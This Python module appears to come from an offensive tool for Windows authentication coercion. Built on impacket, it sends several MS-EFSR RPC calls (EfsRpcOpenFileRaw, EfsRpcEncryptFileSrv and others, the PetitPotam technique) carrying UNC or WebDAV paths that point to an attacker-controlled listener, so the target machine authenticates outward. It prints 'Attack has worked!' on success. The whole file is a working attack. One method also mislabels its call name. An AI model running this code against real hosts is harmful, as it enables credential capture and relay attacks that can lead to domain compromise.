#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : MS_EFSR.py
# Author             : Podalirius (@podalirius_)
# Date created       : 6 Jul 2022


import sys
import time
import random
from .RPCProtocol import RPCProtocol
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR, DWORD, LONG
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY


def gen_random_name(length=8):
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    name = ""
    for k in range(length):
        name += random.choice(alphabet)
    return name


class EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (
        ('FileName', WSTR),  # Type: wchar_t *
    )


class EfsRpcEncryptFileSrvResponse(NDRCALL):
    structure = ()


class EfsRpcDecryptFileSrv(NDRCALL):
    opnum = 5
    structure = (
        ('FileName', WSTR),  # Type: wchar_t *
        ('long', LONG),      # Type: unsigned
    )


class EfsRpcDecryptFileSrvResponse(NDRCALL):
    structure = ()


class EfsRpcFileKeyInfo(NDRCALL):
    opnum = 12
    structure = (
        ('FileName', WSTR),   # Type: wchar_t *
        ('InfoClass', DWORD)  # Type: DWORD
    )


class EfsRpcFileKeyInfoResponse(NDRCALL):
    structure = ()


class EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ('FileName', WSTR),  # Type: wchar_t *
        ('Flags', LONG),     # Type: long
    )


class EfsRpcOpenFileRawResponse(NDRCALL):
    structure = ()


class EfsRpcQueryRecoveryAgents(NDRCALL):
    opnum = 7
    structure = (
        ('FileName', WSTR),  # Type: wchar_t *
    )


class EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
    structure = ()


class EfsRpcQueryUsersOnFile(NDRCALL):
    opnum = 6
    structure = (
        ('FileName', WSTR),  # Type: wchar_t *
    )


class EfsRpcQueryUsersOnFileResponse(NDRCALL):
    structure = ()


class MS_EFSR(RPCProtocol):
    name = "[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol"
    shortname = "MS-EFSR"
    uuid = "c681d488-d850-11d0-8c52-00c04fd90f7e"
    version = "1.0"
    available_pipes = [r"\PIPE\lsarpc", r"\PIPE\efsrpc"]

    auth_type = RPC_C_AUTHN_WINNT
    auth_level = RPC_C_AUTHN_LEVEL_PKT_PRIVACY

    def EfsRpcOpenFileRaw(self, listener, max_retries=3):
        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8
        # Finding credits: @topotam77
        call_name, call_opnum = "EfsRpcOpenFileRaw", 0
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = EfsRpcOpenFileRaw()
                    if self.webdav_host is not None and self.webdav_port is not None:
                        request['FileName'] = '\\\\%s@%d/%s\\%s\\file.txt\x00' % (self.webdav_host, self.webdav_port, gen_random_name(length=3), gen_random_name())
                    else:
                        request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                    request['Flags'] = 0
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("Got (0x7b):\x1b[1;91mERROR_INVALID_NAME\x1b[0m | This can happen, waiting 20 seconds before retry ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;91mrpc_s_access_denied\x1b[0m")
                        return False
                    elif "nca_s_unk_if" in str(e):
                        # nca_s_unk_if
                        print("\x1b[1;91mnca_s_unk_if\x1b[0m")
                        return False
                    else:
                        print("\x1b[1;91m%s\x1b[0m" % str(e))
                        if self.debug:
                            pass
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def EfsRpcEncryptFileSrv(self, listener, max_retries=3):
        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/0d599976-758c-4dbd-ac8c-c9db2a922d76
        # Finding credits: @topotam77
        call_name, call_opnum = "EfsRpcEncryptFileSrv", 4
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = EfsRpcEncryptFileSrv()
                    if self.webdav_host is not None and self.webdav_port is not None:
                        request['FileName'] = '\\\\%s@%d/%s\\%s\\file.txt\x00' % (self.webdav_host, self.webdav_port, gen_random_name(length=3), gen_random_name())
                    else:
                        request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("Got (0x7b):\x1b[1;91mERROR_INVALID_NAME\x1b[0m | This can happen, waiting 20 seconds before retry ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;91mrpc_s_access_denied\x1b[0m")
                        return False
                    elif "nca_s_unk_if" in str(e):
                        # nca_s_unk_if
                        print("\x1b[1;91mnca_s_unk_if\x1b[0m")
                        return False
                    else:
                        print("\x1b[1;91m%s\x1b[0m" % str(e))
                        if self.debug:
                            pass
        else:
            if self.verbose:
                print("   [!] Error: dce is None, you must call connect() first.")

    def EfsRpcDecryptFileSrv(self, listener, max_retries=3):
        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/043715de-caee-402a-a61b-921743337e78
        # Finding credits: @topotam77
        call_name, call_opnum = "EfsRpcDecryptFileSrv", 5
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = EfsRpcDecryptFileSrv()
                    if self.webdav_host is not None and self.webdav_port is not None:
                        request['FileName'] = '\\\\%s@%d/%s\\%s\\file.txt\x00' % (self.webdav_host, self.webdav_port, gen_random_name(length=3), gen_random_name())
                    else:
                        request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                    request['long'] = 0
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("Got (0x7b):\x1b[1;91mERROR_INVALID_NAME\x1b[0m | This can happen, waiting 20 seconds before retry ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;91mrpc_s_access_denied\x1b[0m")
                        return False
                    elif "nca_s_unk_if" in str(e):
                        # nca_s_unk_if
                        print("\x1b[1;91mnca_s_unk_if\x1b[0m")
                        return False
                    else:
                        print("\x1b[1;91m%s\x1b[0m" % str(e))
                        if self.debug:
                            pass
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def EfsRpcQueryUsersOnFile(self, listener, max_retries=3):
        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/a058dc6c-bb7e-491c-9143-a5cb1f7e7cea
        # Finding credits: @topotam77
        call_name, call_opnum = "EfsRpcQueryUsersOnFile", 6
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = EfsRpcQueryUsersOnFile()
                    if self.webdav_host is not None and self.webdav_port is not None:
                        request['FileName'] = '\\\\%s@%d/%s\\%s\\file.txt\x00' % (self.webdav_host, self.webdav_port, gen_random_name(length=3), gen_random_name())
                    else:
                        request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("Got (0x7b):\x1b[1;91mERROR_INVALID_NAME\x1b[0m | This can happen, waiting 20 seconds before retry ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;91mrpc_s_access_denied\x1b[0m")
                        return False
                    elif "nca_s_unk_if" in str(e):
                        # nca_s_unk_if
                        print("\x1b[1;91mnca_s_unk_if\x1b[0m")
                        return False
                    else:
                        print("\x1b[1;91m%s\x1b[0m" % str(e))
                        if self.debug:
                            pass
        else:
            print("[!] Error: dce is None, you must call connect() first.")
        return False

    def EfsRpcQueryRecoveryAgents(self, listener, max_retries=3):
        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/cf759c00-1b90-4c33-9ace-f51c20149cea
        # Finding credits: @topotam77
        call_name, call_opnum = "EfsRpcQueryRecoveryAgents", 7
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = EfsRpcQueryRecoveryAgents()
                    if self.webdav_host is not None and self.webdav_port is not None:
                        request['FileName'] = '\\\\%s@%d/%s\\%s\\file.txt\x00' % (self.webdav_host, self.webdav_port, gen_random_name(length=3), gen_random_name())
                    else:
                        request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("Got (0x7b):\x1b[1;91mERROR_INVALID_NAME\x1b[0m | This can happen, waiting 20 seconds before retry ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;91mrpc_s_access_denied\x1b[0m")
                        return False
                    elif "nca_s_unk_if" in str(e):
                        # nca_s_unk_if
                        print("\x1b[1;91mnca_s_unk_if\x1b[0m")
                        return False
                    else:
                        print("\x1b[1;91m%s\x1b[0m" % str(e))
                        if self.debug:
                            pass
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    def EfsRpcFileKeyInfo(self, listener, max_retries=3):
        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/6813bfa8-1538-4c5f-982a-ad58caff3c1c
        # Finding credits: @topotam77
        call_name, call_opnum = "EfsRpcEncryptFileSrv", 12
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = EfsRpcFileKeyInfo()
                    if self.webdav_host is not None and self.webdav_port is not None:
                        request['FileName'] = '\\\\%s@%d/%s\\%s\\file.txt\x00' % (self.webdav_host, self.webdav_port, gen_random_name(length=3), gen_random_name())
                    else:
                        request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                    request['InfoClass'] = 0
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("Got (0x7b):\x1b[1;91mERROR_INVALID_NAME\x1b[0m | This can happen, waiting 20 seconds before retry ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;91mrpc_s_access_denied\x1b[0m")
                        return False
                    elif "nca_s_unk_if" in str(e):
                        # nca_s_unk_if
                        print("\x1b[1;91mnca_s_unk_if\x1b[0m")
                        return False
                    else:
                        print("\x1b[1;91m%s\x1b[0m" % str(e))
                        if self.debug:
                            pass
        else:
            print("[!] Error: dce is None, you must call connect() first.")

    @classmethod
    def list_coerce_methods(cls):
        return [
            ("EfsRpcOpenFileRaw", 0, None),
            ("EfsRpcEncryptFileSrv", 4, None),
            ("EfsRpcDecryptFileSrv", 5, None),
            ("EfsRpcQueryUsersOnFile", 6, None),
            ("EfsRpcQueryRecoveryAgents", 7, None),
            ("EfsRpcFileKeyInfo", 12, None)
        ]

    def perform_coerce_calls(self, listener):
        self.EfsRpcOpenFileRaw(listener)
        self.EfsRpcEncryptFileSrv(listener)
        self.EfsRpcDecryptFileSrv(listener)
        self.EfsRpcQueryUsersOnFile(listener)
        self.EfsRpcQueryRecoveryAgents(listener)
        self.EfsRpcFileKeyInfo(listener)

